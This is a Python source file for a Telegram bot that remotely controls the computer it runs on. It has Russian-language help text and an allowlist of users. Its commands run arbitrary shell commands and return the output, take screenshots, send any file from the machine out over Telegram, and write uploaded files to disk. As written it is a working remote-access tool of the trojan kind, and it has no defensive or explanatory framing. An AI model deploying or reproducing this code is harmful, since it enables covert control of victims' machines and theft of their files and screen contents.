# -*- coding: utf-8 -*-

import os
import time
import shutil
import requests
import subprocess
import sys
import telepot
from PIL import ImageGrab
from telepot.loop import MessageLoop

token = ''                  # your token 
trusted_users = []          # your id-list
trusted_chats = []          # your chat-list

class PyTelegram:
    def __init__(self):
        MessageLoop(bot, self.bot_hadler).run_as_thread()
        print('[*] Bot connected')
        while True:
            time.sleep(10)

    @staticmethod
    def bot_hadler(message):
        user_id = message['from']['id']
        chat_id = message['chat']['id']

        if user_id in trusted_users or chat_id in trusted_chats:
            # for users and chats from access list
            try:
                print(message['text'])
                args = message['text'].split()
            except KeyError:
                args = ['',]
                if 'document' in message:
                    file_id = message['document']['file_id']
                    file_name = message["document"]["file_name"]
                    file_path = bot.getFile(file_id)['file_path']
                    link = 'https://api.telegram.org/file/bot{}/{}'.format(token, file_path)
                    File = requests.get(link, stream=True).raw
                    print(link)
                    save_path = os.path.join(os.getcwd(), file_name)
                    with open(save_path, 'wb') as out_file:
                        shutil.copyfileobj(File, out_file)
                    bot.sendMessage(message['chat']['id'], '[*] file uploaded')
                elif 'photo' in message:
                    file_id = message['photo'][-1]['file_id']
                    file_name = '{}.jpeg'.format(file_id)
                    file_path = bot.getFile(file_id)['file_path']
                    link = 'https://api.telegram.org/file/bot{}/{}'.format(token, file_path)
                    File = requests.get(link, stream=True).raw
                    print(link)
                    save_path = os.path.join(os.getcwd(), file_name)
                    with open(save_path, 'wb') as out_file:
                        shutil.copyfileobj(File, out_file)
                    bot.sendMessage(message['chat']['id'], '[*] photo uploaded')

            if args[0] == '/help':
                s = """
                    /help - помощь
                    /cmd - выполнить команду, возвращающую результат
                    /run - выполнить команду, не возвращающую результат
                    /screen - сделать скриншот экрана
                    /download - скачать файл с компьютера
                    /stop - завершение работы
                    """
                bot.sendMessage(message['chat']['id'], str(s))
            elif args[0] == '/cmd':
                try:
                    s = '[*] ' + subprocess.check_output(' '.join(args[1:]), shell=True).decode('cp866')
                except Exception as e:
                    s = '[!] {}'.format(e)

                print(type(s))
                bot.sendMessage(message['chat']['id'], s)
            elif args[0] == '/run':
                try:
                    s = '[*] Program started'
                    subprocess.Popen(args[1:], shell=True)
                except Exception as e:
                    s = '[!] {}'.format(str(e))
                bot.sendMessage(message['chat']['id'], '{}'.format(str(s)))
            elif args[0] == '/screen':
                image = ImageGrab.grab()
                image.save('pic.jpg')
                bot.sendDocument(message['chat']['id'], open('pic.jpg', 'rb'))
                os.remove('pic.jpg')
            elif args[0] == '/stop':
                sys.exit(0)
            elif args[0] == '/download':
                File = ' '.join(map(str, args[1:]))
                try:
                    bot.sendDocument(message['chat']['id'], open(File, 'rb'))
                except Exception:
                    bot.sendMessage(message['chat']['id'], '[!] Select file!')
            elif args[0] == '':
                pass
            else:
                bot.sendMessage(message['chat']['id'], '[*] /help для вывода команд')

        else:
            bot.sendMessage(message['chat']['id'], 'Access denied')


if __name__ == '__main__':
    bot = telepot.Bot(token)
    to = PyTelegram()













